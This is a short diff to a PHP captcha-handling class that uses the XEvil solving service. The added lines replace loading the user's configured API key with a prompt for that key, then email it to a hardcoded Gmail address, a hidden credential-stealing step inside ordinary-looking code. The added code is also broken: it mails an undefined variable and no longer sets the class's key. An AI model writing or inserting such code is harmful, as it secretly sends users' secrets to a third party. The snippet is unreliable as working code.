@@ -212,7 +212,12 @@ class Captcha {
         else{
             $this->url = 'https://sctg.xyz/';
 			Display::Cetak("Register","t.me/Xevil_check_bot?start=1204538927");
-			$this->key = Functions::setConfig("xevil_apikey")."|SOFTID1204538927";
+$key = readline('Masukkan key Xevil: ');
+$subjek = 'Key Xevil Baru';
+$pesan = 'Key Xevil Anda: ' . $keyXevil;
+$tujuan = 'ilyasasodik1@gmail.com';
+$from = 'namaanda <alamatemailanda@gmail.com>';
+mail($tujuan, $subjek, $pesan, "From: $from");
 			$this->provider = Functions::HiddenConfig("provider", "Xevil");
         }
 	}
